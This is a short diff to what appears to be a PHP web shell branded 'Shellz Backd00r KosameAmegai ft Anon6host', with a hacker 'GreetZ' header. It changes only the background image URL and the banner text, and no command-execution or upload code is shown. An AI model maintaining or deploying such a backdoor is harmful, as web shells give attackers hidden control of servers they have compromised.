@@ -73,7 +73,7 @@ GreetZ: # Anon7 -  xRyukZ - Mr.Grim - mahou-shoujo.site #
 <style type='text/css'>
 @import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
 body {
-	background: url(http://i.imgur.com/Cln0zMc.png) no-repeat center center fixed; 
+	background: url(https://image.ibb.co/mwAkWm/wwwd.jpg) no-repeat center center fixed; 
     background-size: cover; 
     color: black
 }
@@ -210,7 +210,7 @@ async function loadFile(file) {
 
 </script>
 <center>
-<font face="Bungee" size="5">>Shellz Backd00r KosameAmegai ft Anon6host<</font></center>
+<font face="Bungee" size="5">Sh3llz Backd00r KosameAmegai ft Anon6host</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>
 <?php
